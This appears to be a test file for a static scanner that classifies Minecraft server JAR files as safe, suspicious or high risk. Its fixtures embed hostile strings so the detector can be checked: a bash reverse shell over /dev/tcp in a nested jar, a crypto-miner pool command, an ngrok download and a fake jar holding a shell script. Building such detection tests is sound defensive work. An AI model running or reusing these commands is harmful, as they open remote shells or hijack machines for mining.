// Static JAR analysis: files are opened as ZIP archives and never executed.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { ZipArchive } from 'archiver';
import { load, tmpdir } from '../helpers/load.mjs';
const S = await load('packages/shared/src/index.ts');
const dir = tmpdir();
function jar(name, entries) {
  return new Promise((res, rej) => {
    const file = path.join(dir, name); const out = fs.createWriteStream(file); const a = new ZipArchive();
    out.on('close', () => res(file)); a.on('error', rej); a.pipe(out);
    for (const [n, c] of Object.entries(entries)) a.append(Buffer.isBuffer(c) ? c : Buffer.from(c), { name: n });
    a.finalize();
  });
}
const cls = (s = '') => Buffer.concat([Buffer.from([0xca, 0xfe, 0xba, 0xbe]), Buffer.from(s)]);

test('recognised Paper server jar is SAFE', async () => {
  const f = await jar('paper.jar', { 'META-INF/MANIFEST.MF': 'Main-Class: io.papermc.paperclip.Main\n', 'io/papermc/paperclip/Main.class': cls('paperclip'), 'META-INF/versions.list': 'x' });
  const r = await S.scanJar(f); assert.equal(r.level, 'safe'); assert.ok(r.minecraft.detected);
});
test('unknown jar without Minecraft strings is SUSPICIOUS (review), never HIGH RISK by itself', async () => {
  const f = await jar('custom.jar', { 'META-INF/MANIFEST.MF': 'Main-Class: com.example.App\n', 'com/example/App.class': cls('hello world') });
  const r = await S.scanJar(f); assert.equal(r.level, 'suspicious'); assert.equal(r.findings.filter(x => x.severity === 'high').length, 0);
});
test('embedded crypto-miner signature is HIGH RISK', async () => {
  const f = await jar('miner.jar', { 'META-INF/MANIFEST.MF': 'Main-Class: io.papermc.paperclip.Main\n', 'io/papermc/paperclip/Main.class': cls('x'), 'a/B.class': cls('connect stratum+tcp://pool.example:3333 --donate-level 1') });
  const r = await S.scanJar(f); assert.equal(r.level, 'high_risk'); assert.match(r.reason, /crypto-mining/);
});
test('reverse shell inside a nested jar is HIGH RISK', async () => {
  const inner = fs.readFileSync(await jar('inner.jar', { 'x/Y.class': cls('Runtime.exec("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")') }));
  const f = await jar('outer.jar', { 'org/bukkit/craftbukkit/Main.class': cls(), 'META-INF/libs/inner.jar': inner });
  const r = await S.scanJar(f); assert.equal(r.level, 'high_risk'); assert.ok(r.findings.some(x => x.entry.includes('!/')));
});
test('tunnel software on a Minecraft jar is SUSPICIOUS, not high risk', async () => {
  const f = await jar('tunnel.jar', { 'net/minecraft/server/Main.class': cls(), 'p/Q.class': cls('download https://bin.equinox.io/ngrok.io/agent') });
  const r = await S.scanJar(f); assert.equal(r.level, 'suspicious');
});
test('public-suffix data lists do not trigger tunnel rules; trusted hashes skip scanning', async () => {
  const f = await jar('psl.jar', { 'net/minecraft/server/Main.class': cls(), 'mozilla/public_suffix_list.dat': 'trycloudflare.com\nngrok.io\n' });
  assert.equal((await S.scanJar(f)).level, 'safe');
  const m = await jar('trusted.jar', { 'a.class': cls('xmrig') }); const h = await S.hashFile(m);
  const r = await S.scanJar(m, new Set([typeof h === 'string' ? h : h.sha256])); assert.equal(r.trusted, true); assert.equal(r.level, 'safe');
});
test('non-zip file is flagged, not executed', async () => {
  const f = path.join(dir, 'fake.jar'); fs.writeFileSync(f, '#!/bin/sh\necho pwned > /tmp/pwned\n');
  const r = await S.scanJar(f); assert.notEqual(r.level, 'safe'); assert.ok(r.findings.some(x => x.rule === 'not-a-zip'));
});
